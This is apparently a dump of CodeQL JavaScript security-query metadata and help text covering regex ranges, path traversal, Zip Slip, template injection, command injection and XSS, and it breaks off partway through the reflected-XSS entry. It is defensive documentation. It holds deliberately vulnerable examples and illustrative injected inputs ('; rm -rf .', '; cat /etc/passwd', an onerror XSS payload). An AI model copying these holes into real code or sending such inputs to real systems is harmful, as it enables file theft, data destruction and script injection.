  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/OverlyLargeRange.bqrs
  metadata:
    name: Overly permissive regular expression range
    description: |-
      Overly permissive regular expression ranges match a wider range of characters than intended.
                    This may allow an attacker to bypass a filter or sanitizer.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/overly-large-range
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Overly permissive regular expression range
    It's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \ ] ^ _ ` ``.

    Another common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.


    ## Recommendation
    Avoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.


    ## Example
    The following example code is intended to check whether a string is a valid 6 digit hex color.

    ```javascript

    function isValidHexColor(color) {
        return /^#[0-9a-fA-f]{6}$/i.test(color);
    }

    ```
    However, the `A-f` range is overly large and matches every uppercase character. It would parse a "color" like `#XXYYZZ` as valid.

    The fix is to use an uppercase `A-F` range instead.

    ```javascript

    function isValidHexColor(color) {
        return /^#[0-9A-F]{6}$/i.test(color);
    }

    ```

    ## References
    * GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)
    * wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)
    * Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)
    * Paul Boyd: [The regex \[,-.\]](https://pboyd.io/posts/comma-dash-dot/)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-020/UselessRegExpCharacterEscape.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/UselessRegExpCharacterEscape.bqrs
  metadata:
    name: Useless regular-expression character escape
    description: |-
      Prepending a backslash to an ordinary character in a string
                    does not have any effect, and may make regular expressions constructed from this string
                    behave unexpectedly.
    kind: problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/useless-regexp-character-escape
    tags: |-
      correctness
             security
             external/cwe/cwe-020
  queryHelp: |
    # Useless regular-expression character escape
    When a character in a string literal or regular expression literal is preceded by a backslash, it is interpreted as part of an escape sequence. For example, the escape sequence `\n` in a string literal corresponds to a single `newline` character, and not the `\` and `n` characters. However, not all characters change meaning when used in an escape sequence. In this case, the backslash just makes the character appear to mean something else, and the backslash actually has no effect. For example, the escape sequence `\k` in a string literal just means `k`. Such superfluous escape sequences are usually benign, and do not change the behavior of the program.

    The set of characters that change meaning when in escape sequences is different for regular expression literals and string literals. This can be problematic when a regular expression literal is turned into a regular expression that is built from one or more string literals. The problem occurs when a regular expression escape sequence loses its special meaning in a string literal.


    ## Recommendation
    Ensure that the right amount of backslashes is used when escaping characters in strings, template literals and regular expressions. Pay special attention to the number of backslashes when rewriting a regular expression as a string literal.


    ## Example
    The following example code checks that a string is `"my-marker"`, possibly surrounded by white space:


    ```javascript
    let regex = new RegExp('(^\s*)my-marker(\s*$)'),
        isMyMarkerText = regex.test(text);

    ```
    However, the check does not work properly for white space as the two `\s` occurrences are semantically equivalent to just `s`, meaning that the check will succeed for strings like `"smy-markers"` instead of `" my-marker "`. Address these shortcomings by either using a regular expression literal (`/(^\s*)my-marker(\s*$)/`), or by adding extra backslashes (`'(^\\s*)my-marker(\\s*$)'`).


    ## References
    * MDN: [Regular expression escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Escaping)
    * MDN: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation)
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-022/TaintedPath.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/TaintedPath.bqrs
  metadata:
    name: Uncontrolled data used in path expression
    description: |-
      Accessing paths influenced by users can allow an attacker to access
                    unexpected resources.
    kind: path-problem
    problem.severity: error
    security-severity: 7.5
    precision: high
    id: js/path-injection
    tags: |-
      security
             external/cwe/cwe-022
             external/cwe/cwe-023
             external/cwe/cwe-036
             external/cwe/cwe-073
             external/cwe/cwe-099
  queryHelp: |
    # Uncontrolled data used in path expression
    Accessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.


    ## Recommendation
    Validate user input before using it to construct a file path.

    The validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.

    In the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any ".." segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.

    In the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove "../" sequences: for example, applying this filter to ".../...//" would still result in the string "../".

    Finally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.


    ## Example
    In the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing "../" segments to navigate outside the root folder and access sensitive files.


    ```javascript
    const fs = require('fs'),
          http = require('http'),
          url = require('url');

    const ROOT = "/var/www/";

    var server = http.createServer(function(req, res) {
      let filePath = url.parse(req.url, true).query.path;

      // BAD: This function uses unsanitized input that can read any file on the file system.
      res.write(fs.readFileSync(ROOT + filePath, 'utf8'));
    });
    ```
    The second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any "../" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.


    ```javascript
    const fs = require('fs'),
          http = require('http'),
          path = require('path'),
          url = require('url');

    const ROOT = "/var/www/";

    var server = http.createServer(function(req, res) {
      let filePath = url.parse(req.url, true).query.path;

      // GOOD: Verify that the file path is under the root directory
      filePath = fs.realpathSync(path.resolve(ROOT, filePath));
      if (!filePath.startsWith(ROOT)) {
        res.statusCode = 403;
        res.end();
        return;
      }
      res.write(fs.readFileSync(filePath, 'utf8'));
    });
    ```

    ## References
    * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
    * npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.
    * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
    * Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).
    * Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).
    * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
    * Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-022/ZipSlip.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/ZipSlip.bqrs
  metadata:
    name: Arbitrary file access during archive extraction ("Zip Slip")
    description: |-
      Extracting files from a malicious ZIP file, or similar type of archive, without
                    validating that the destination file path is within the destination directory
                    can allow an attacker to unexpectedly gain access to resources.
    kind: path-problem
    id: js/zipslip
    problem.severity: error
    security-severity: 7.5
    precision: high
    tags: |-
      security
             external/cwe/cwe-022
  queryHelp: |
    # Arbitrary file access during archive extraction ("Zip Slip")
    Extracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.

    Zip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.

    For example, if a zip file contains a file entry `..\sneaky-file`, and the zip file is extracted to the directory `c:\output`, then naively combining the paths would result in an output file path of `c:\output\..\sneaky-file`, which would cause the file to be written to `c:\sneaky-file`.


    ## Recommendation
    Ensure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.

    The recommended way of writing an output file from a zip archive entry is to check that `".."` does not occur in the path.


    ## Example
    In this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.


    ```javascript
    const fs = require('fs');
    const unzip = require('unzip');

    fs.createReadStream('archive.zip')
      .pipe(unzip.Parse())
      .on('entry', entry => {
        const fileName = entry.path;
        // BAD: This could write any file on the filesystem.
        entry.pipe(fs.createWriteStream(fileName));
      });

    ```
    To fix this vulnerability, we need to check that the path does not contain any `".."` elements in it.


    ```javascript
    const fs = require('fs');
    const unzip = require('unzip');

    fs.createReadStream('archive.zip')
      .pipe(unzip.Parse())
      .on('entry', entry => {
        const fileName = entry.path;
        // GOOD: ensures the path is safe to write to.
        if (fileName.indexOf('..') == -1) {
          entry.pipe(fs.createWriteStream(fileName));
        }
        else {
          console.log('skipping bad path', fileName);
        }
      });

    ```

    ## References
    * Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).
    * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
    * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-073/TemplateObjectInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-073/TemplateObjectInjection.bqrs
  metadata:
    name: Template Object Injection
    description: Instantiating a template using a user-controlled object is vulnerable
      to local file read and potential remote code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/template-object-injection
    tags: |-
      security
             external/cwe/cwe-073
             external/cwe/cwe-094
  queryHelp: |
    # Template Object Injection
    Directly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.


    ## Recommendation
    Avoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.


    ## Example
    In the example below a server uses the user-controlled `profile` object to render the `index` template.


    ```javascript
    var app = require('express')();
    app.set('view engine', 'hbs');

    app.post('/', function (req, res, next) {
        var profile = req.body.profile;
        res.render('index', profile);
    });
    ```
    However, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.

    The fix is to have the server construct the object, and only add the properties that are needed by the template.


    ```javascript
    var app = require('express')();
    app.set('view engine', 'hbs');

    app.post('/', function (req, res, next) {
        var profile = req.body.profile;
        res.render('index', {
            name: profile.name,
            location: profile.location
        });
    });
    ```

    ## References
    * blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).
    * cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
    * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/CommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/CommandInjection.bqrs
  metadata:
    name: Uncontrolled command line
    description: |-
      Using externally controlled strings in a command line may allow a malicious
                    user to change the meaning of the command.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Uncontrolled command line
    Code that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.


    ## Recommendation
    If possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    If this approach is not viable, then add code to verify that the user input string is safe before using it.


    ## Example
    The following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        cp.execSync(`wc -l ${file}`); // BAD
    });

    ```
    A malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.

    To avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        cp.execFileSync('wc', ['-l', file]); // GOOD
    });

    ```
    If you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url'),
        shellQuote = require('shell-quote');

    var server = http.createServer(function(req, res) {
        let options = url.parse(req.url, true).query.options;

        cp.execFileSync('wc', shellQuote.parse(options)); // GOOD
    });

    ```
    Alternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        // only allow safe characters in file name
        if (file.match(/^[\w\.\-\/]+$/)) {
            cp.execSync(`wc -l ${file}`); // GOOD
        }
    });

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/IndirectCommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/IndirectCommandInjection.bqrs
  metadata:
    name: Indirect uncontrolled command line
    description: |-
      Forwarding command-line arguments to a child process
                    executed within a shell may indirectly introduce
                    command-line injection vulnerabilities.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: medium
    id: js/indirect-command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Indirect uncontrolled command line
    Forwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.

    When the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.


    ## Recommendation
    If possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    If this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.


    ## Example
    The following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `"dollar$separated$name"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.


    ```javascript
    var cp = require("child_process");

    const args = process.argv.slice(2);
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execSync(`node ${script} ${args.join(' ')}`); // BAD

    ```
    If another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.

    To guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:


    ```javascript
    var cp = require("child_process");

    const args = process.argv.slice(2);
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execFileSync('node', [script].concat(args)); // GOOD

    ```
    If you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


    ```javascript
    var cp = require("child_process"),
        shellQuote = require("shell-quote");

    const args = process.argv.slice(2);
    let nodeOpts = '';
    if (args[0] === '--node-opts') {
        nodeOpts = args[1];
        args.splice(0, 2);
    }
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/SecondOrderCommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/SecondOrderCommandInjection.bqrs
  metadata:
    name: Second order command injection
    description: |-
      Using user-controlled data as arguments to some commands, such as git clone,
                    can allow arbitrary commands to be executed.
    kind: path-problem
    problem.severity: error
    security-severity: 7.0
    precision: high
    id: js/second-order-command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Second order command injection
    Some shell commands, like `git ls-remote`, can execute arbitrary commands if a user provides a malicious URL that starts with `--upload-pack`. This can be used to execute arbitrary code on the server.


    ## Recommendation
    Sanitize user input before passing it to the shell command. For example, ensure that URLs are valid and do not contain malicious commands.


    ## Example
    The following example shows code that executes `git ls-remote` on a URL that can be controlled by a malicious user.


    ```javascript
    const express = require("express");
    const app = express();

    const cp = require("child_process");

    app.get("/ls-remote", (req, res) => {
      const remote = req.query.remote;
      cp.execFile("git", ["ls-remote", remote]); // NOT OK
    });

    ```
    The problem has been fixed in the snippet below, where the URL is validated before being passed to the shell command.


    ```javascript
    const express = require("express");
    const app = express();

    const cp = require("child_process");

    app.get("/ls-remote", (req, res) => {
      const remote = req.query.remote;
      if (!(remote.startsWith("git@") || remote.startsWith("https://"))) {
        throw new Error("Invalid remote: " + remote);
      }
      cp.execFile("git", ["ls-remote", remote]); // OK
    });

    ```

    ## References
    * Max Justicz: [Hacking 3,000,000 apps at once through CocoaPods](https://justi.cz/security/2021/04/20/cocoapods-rce.html).
    * Git: [Git - git-ls-remote Documentation](https://git-scm.com/docs/git-ls-remote/2.22.0#Documentation/git-ls-remote.txt---upload-packltexecgt).
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/ShellCommandInjectionFromEnvironment.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/ShellCommandInjectionFromEnvironment.bqrs
  metadata:
    name: Shell command built from environment values
    description: |-
      Building a shell command string with values from the enclosing
                    environment may cause subtle bugs or vulnerabilities.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: high
    id: js/shell-command-injection-from-environment
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Shell command built from environment values
    Dynamically constructing a shell command with values from the local environment, such as file paths, may inadvertently change the meaning of the shell command. Such changes can occur when an environment value contains characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


    ## Recommendation
    If possible, use hard-coded string literals to specify the shell command to run, and provide the dynamic arguments to the shell command separately to avoid interpretation by the shell.

    Alternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters in environment values do not alter the shell command unexpectedly.


    ## Example
    The following example shows a dynamically constructed shell command that recursively removes a temporary directory that is located next to the currently executing JavaScript file. Such utilities are often found in custom build scripts.


    ```javascript
    var cp = require("child_process"),
      path = require("path");
    function cleanupTemp() {
      let cmd = "rm -rf " + path.join(__dirname, "temp");
      cp.execSync(cmd); // BAD
    }

    ```
    The shell command will, however, fail to work as intended if the absolute path of the script's directory contains spaces. In that case, the shell command will interpret the absolute path as multiple paths, instead of a single path.

    For instance, if the absolute path of the temporary directory is `/home/username/important project/temp`, then the shell command will recursively delete `/home/username/important` and `project/temp`, where the latter path gets resolved relative to the working directory of the JavaScript process.

    Even worse, although less likely, a malicious user could provide the path `/home/username/; cat /etc/passwd #/important project/temp` in order to execute the command `cat /etc/passwd`.

    To avoid such potentially catastrophic behaviors, provide the directory as an argument that does not get interpreted by a shell:


    ```javascript
    var cp = require("child_process"),
      path = require("path");
    function cleanupTemp() {
      let cmd = "rm",
        args = ["-rf", path.join(__dirname, "temp")];
      cp.execFileSync(cmd, args); // GOOD
    }

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/UnsafeShellCommandConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UnsafeShellCommandConstruction.bqrs
  metadata:
    name: Unsafe shell command constructed from library input
    description: |-
      Using externally controlled strings in a command line may allow a malicious
                    user to change the meaning of the command.
    kind: path-problem
    problem.severity: error
    security-severity: 6.3
    precision: high
    id: js/shell-command-constructed-from-input
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Unsafe shell command constructed from library input
    Dynamically constructing a shell command with inputs from exported functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


    ## Recommendation
    If possible, provide the dynamic arguments to the shell as an array using a safe API such as `child_process.execFile` to avoid interpretation by the shell.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    Alternatively, if the command must be interpreted by a shell (for example because it includes I/O redirections), you can use `shell-quote` to escape any special characters in the input before embedding it in the command.


    ## Example
    The following example shows a dynamically constructed shell command that downloads a file from a remote URL.


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + path, callback);
    }

    ```
    The shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.

    Even worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.

    To avoid such potentially catastrophic behaviors, provide the inputs from exported functions as an argument that does not get interpreted by a shell:


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.execFile("wget", [path], callback);
    }

    ```
    As another example, consider the following code which is similar to the preceding example, but pipes the output of `wget` into `wc -l` to count the number of lines in the downloaded file.


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + path + " | wc -l", callback);
    };

    ```
    In this case, using `child_process.execFile` is not an option because the shell is needed to interpret the pipe operator. Instead, you can use `shell-quote` to escape the input before embedding it in the command:


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + shellQuote.quote([path]) + " | wc -l", callback);
    };

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/UselessUseOfCat.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UselessUseOfCat.bqrs
  metadata:
    name: Unnecessary use of `cat` process
    description: "Using the  `cat` process to read a file is unnecessarily complex,\
      \ inefficient, unportable, and can lead to subtle bugs, or even security vulnerabilities."
    kind: problem
    problem.severity: error
    security-severity: 6.3
    precision: high
    id: js/unnecessary-use-of-cat
    tags: |-
      correctness
             security
             maintainability
             external/cwe/cwe-078
  queryHelp: |
    # Unnecessary use of `cat` process
    Using the unix command `cat` only to read a file is an unnecessarily complex way to achieve something that can be done in a simpler and safer manner using the Node.js `fs.readFile` API.

    The use of `cat` for simple file reads leads to code that is unportable, inefficient, complex, and can lead to subtle bugs or even security vulnerabilities.


    ## Recommendation
    Use `fs.readFile` or `fs.readFileSync` to read files from the file system.


    ## Example
    The following example shows code that reads a file using `cat`:


    ```javascript
    var child_process = require('child_process');

    module.exports = function (name) {
        return child_process.execSync("cat " + name).toString();
    };

    ```
    The code in the example will break if the input `name` contains special characters (including space). Additionally, it does not work on Windows and if the input is user-controlled, a command injection attack can happen.

    The `fs.readFile` API should be used to avoid these potential issues:


    ```javascript
    var fs = require('fs');

    module.exports = function (name) {
        return fs.readFileSync(name).toString();
    };

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Node.js: [File System API](https://nodejs.org/api/fs.html).
    * [The Useless Use of Cat Award](http://porkmail.org/era/unix/award.html#cat).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/ExceptionXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ExceptionXss.bqrs
  metadata:
    name: Exception text reinterpreted as HTML
    description: |-
      Reinterpreting text from an exception as HTML
                    can lead to a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/xss-through-exception
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# Exception text reinterpreted as HTML\nDirectly writing error messages\
    \ to a webpage without sanitization allows for a cross-site scripting vulnerability\
    \ if parts of the error message can be influenced by a user.\n\n\n## Recommendation\n\
    To guard against cross-site scripting, consider using contextual output encoding/escaping\
    \ before writing user input to the page, or one of the other solutions that are\
    \ mentioned in the references.\n\n\n## Example\nThe following example shows an\
    \ exception being written directly to the document, and this exception can potentially\
    \ be influenced by the page URL, leaving the website vulnerable to cross-site\
    \ scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href\
    \ = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\"\
    )+8);\n    \n    try {\n        var parsed = unknownParseFunction(deflt); \n \
    \   } catch(e) {\n        document.write(\"Had an error: \" + e + \".\");\n  \
    \  }\n}\n\n```\n\n## Example\nThis second example shows an input being validated\
    \ using the JSON schema validator `ajv`, and in case of an error, the error message\
    \ is sent directly back in the response.\n\n\n```javascript\nimport express from\
    \ 'express';\nimport Ajv from 'ajv';\n\nlet app = express();\nlet ajv = new Ajv();\n\
    \najv.addSchema({type: 'object', additionalProperties: {type: 'number'}}, 'pollData');\n\
    \napp.post('/polldata', (req, res) => {\n    if (!ajv.validate('pollData', req.body))\
    \ {\n        res.send(ajv.errorsText());\n    }\n});\n\n```\nThis is unsafe, because\
    \ the error message can contain parts of the input. For example, the input `{'<img\
    \ src=x onerror=alert(1)>': 'foo'}` will generate the error `data/<img src=x onerror=alert(1)>\
    \ should be number`, causing reflected XSS.\n\n\n## References\n* OWASP: [DOM\
    \ based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
    \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/ReflectedXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ReflectedXss.bqrs
  metadata:
    name: Reflected cross-site scripting
    description: |-
      Writing user input directly to an HTTP response allows for
                    a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/reflected-xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Reflected cross-site scripting
    Directly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

